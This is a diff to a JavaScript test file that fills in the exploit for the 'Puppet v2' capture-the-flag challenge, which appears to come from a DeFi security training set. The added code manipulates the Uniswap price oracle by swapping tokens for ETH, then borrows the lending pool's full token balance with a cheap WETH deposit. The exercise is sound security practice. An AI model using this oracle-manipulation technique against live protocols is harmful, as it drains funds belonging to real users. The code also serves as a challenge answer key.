@@ -82,6 +82,48 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        let rate = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        let attackerEthBalance = await ethers.provider.getBalance(attacker.address);
+        console.log('rate before:', ethers.utils.formatEther(rate));
+        console.log('bal  before:', ethers.utils.formatEther(attackerEthBalance));
+        
+        const time = (await ethers.provider.getBlock('latest')).timestamp;
+
+        const amount = ATTACKER_INITIAL_TOKEN_BALANCE;
+        this.token.connect(attacker).approve(this.uniswapRouter.address, ethers.constants.MaxUint256);
+        
+        const path = [this.token.address, this.weth.address];
+        // function swapExactTokensForETH(
+        //     uint amountIn, 
+        //     uint amountOutMin, 
+        //     address[] calldata path, 
+        //     address to, 
+        //     uint deadline
+        // )
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            amount, 
+            1e8,
+            path,
+            attacker.address,
+            time + 10
+        );
+
+        // first iteration
+        rate = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        attackerEthBalance = await ethers.provider.getBalance(attacker.address);
+        console.log('rate after :', ethers.utils.formatEther(rate));
+        console.log('bal  after :', ethers.utils.formatEther(attackerEthBalance));
+        expect(rate).to.be.lt(attackerEthBalance);
+
+        //We need to convert ETH to WETH and give allowance
+        await this.weth.connect(attacker).deposit({value: rate});
+        await this.weth.connect(attacker).approve(this.lendingPool.address, rate);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        const poolBalance = await this.token.balanceOf(this.lendingPool.address);
+        const attackerBalance = await this.token.balanceOf(attacker.address);
+        console.log('Pool Balance: ', ethers.utils.formatEther(poolBalance));
+        console.log('Attacker Balance: ', ethers.utils.formatEther(attackerBalance));        
     });
 
     after(async function () {
